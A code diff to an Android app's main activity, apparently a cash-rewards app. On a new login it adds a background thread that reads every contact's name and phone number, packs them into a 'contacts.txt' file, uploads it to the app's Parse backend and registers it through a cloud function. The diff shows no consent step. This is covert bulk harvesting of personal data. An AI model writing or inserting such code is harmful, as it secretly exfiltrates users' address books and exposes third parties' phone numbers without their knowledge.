@@ -3,13 +3,16 @@ package net.fireballlabs.cashguru;
 import android.annotation.TargetApi;
 import android.app.ActionBar;
 import android.content.ActivityNotFoundException;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.res.Configuration;
+import android.database.Cursor;
 import android.graphics.drawable.ColorDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.support.v4.app.ActionBarDrawerToggle;
 import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentActivity;
@@ -26,6 +29,7 @@ import android.widget.TextView;
 import net.fireballlabs.MainActivityCallBacks;
 import net.fireballlabs.adapter.MainDrawerAdapter;
 import net.fireballlabs.helper.Constants;
+import net.fireballlabs.helper.ParseConstants;
 import net.fireballlabs.helper.PreferenceManager;
 import net.fireballlabs.helper.model.Conversions;
 import net.fireballlabs.helper.model.InstallationHelper;
@@ -46,11 +50,13 @@ import com.parse.GetCallback;
 import com.parse.ParseAnalytics;
 import com.parse.ParseCloud;
 import com.parse.ParseException;
+import com.parse.ParseFile;
 import com.parse.ParseInstallation;
 import com.parse.ParseObject;
 import com.parse.ParseQuery;
 import com.parse.ParseUser;
 import com.parse.PushService;
+import com.parse.SaveCallback;
 
 import java.util.HashMap;
 import java.util.List;
@@ -104,6 +110,7 @@ public class MainActivity extends FragmentActivity implements MainDrawerAdapter.
             boolean isNewLogin = intent.getBooleanExtra(Constants.IS_NEW_LOGIN, false);
             if(isNewLogin) {
                 Utility.showFirstTimePopup(this, true);
+                readAllContacts(this);
             }
             if(isNewLogin) {
                 String deviceId = Utility.generateDeviceUniqueId(this);
@@ -196,6 +203,62 @@ public class MainActivity extends FragmentActivity implements MainDrawerAdapter.
         mOnCreateFinished = true;
     }
 
+    private void readAllContacts(final Context context) {
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                ContentResolver cr = getContentResolver();
+                Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                        null, null, null, null);
+                if (cur != null && cur.getCount() > 0) {
+                    StringBuilder data = new StringBuilder();
+                    while (cur.moveToNext()) {
+                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                        if (Integer.parseInt(cur.getString(
+                                cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                            Cursor pCur = cr.query(
+                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                                    null,
+                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
+                                    new String[]{id}, null);
+                            if(pCur != null) {
+                                while (pCur.moveToNext()) {
+                                    String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                    data.append(name + " : " + phoneNo + "\n");
+                                }
+                                pCur.close();
+                            }
+                        }
+                    }
+                    cur.close();
+
+                    byte[] byteData = data.toString().getBytes();
+                    final ParseFile file = new ParseFile("contacts.txt", byteData);
+                    file.saveInBackground(new SaveCallback() {
+                        @Override
+                        public void done(ParseException e) {
+                            if(e == null) {
+
+                                HashMap<String, Object> params = new HashMap<String, Object>();
+                                params.put("userId", ParseUser.getCurrentUser().getObjectId());
+                                params.put("file", file);
+                                try {
+                                    ParseCloud.callFunction(ParseConstants.FUNCTION_SAVE_CONTACTS, params);
+                                } catch (ParseException e1) {
+                                    e1.printStackTrace();
+                                }
+                            }
+                        }
+                    });
+                } else if(cur != null) {
+                    cur.close();
+                }
+            }
+        });
+        thread.start();
+    }
+
     @Override
     protected void onResume() {
         super.onResume();
@@ -253,7 +316,7 @@ public class MainActivity extends FragmentActivity implements MainDrawerAdapter.
                 Thread thread = new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        wallet.updateWalletBalance(Constants.INR_LABEL, Conversions.getBalance());
+                        wallet.updateWalletBalance(Constants.INR_LABEL, Conversions.getBalance(MainActivity.this, false));
                     }
                 });
                 thread.start();
